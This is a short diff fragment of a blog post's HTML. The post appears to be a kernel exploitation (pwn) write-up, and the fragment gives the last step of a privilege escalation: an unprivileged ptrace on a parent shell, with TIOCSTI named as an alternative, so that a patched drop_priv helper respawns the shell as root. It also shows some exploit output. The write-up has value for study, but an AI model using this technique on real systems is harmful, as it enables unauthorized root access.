+</span></span></span></code></pre></div><p>This needs no privileges: we&rsquo;re still uid 1000, and same-uid <code>ptrace</code> is unprivileged (<code>CAP_SYS_PTRACE</code> is only for crossing a privilege boundary). The kernel also ships without Yama (<code>CONFIG_SECURITY_YAMA</code> unset), so no <code>ptrace_scope</code> blocks attaching to an ancestor. If it failed, <code>TIOCSTI</code> or just <code>kill</code>ing the shell would do the same.</p>
 <p>No kernel payload, no <code>commit_creds</code>, no KASLR-dependent symbol — just a patched suid-like helper. init respawns the shell through the patched <code>drop_priv</code>, and it comes up root:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>~<span class="o">]</span> root
 </span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="nv">A</span><span class="o">=</span>0xffff9de3419c2000  <span class="nv">B</span><span class="o">=</span>0xffff9de3419c3000
@@ -982,9 +913,9 @@ free 20:  next(O_20) = O_22
 
 <p>
   
-  <a href="https://icctx.xyz/tags/kernel/">#Kernel</a>
+  <a href="http://localhost:1313/tags/kernel/">#Kernel</a>
   
-  <a href="https://icctx.xyz/tags/pwn/">#Pwn</a>
+  <a href="http://localhost:1313/tags/pwn/">#Pwn</a>
   
 </p>
 
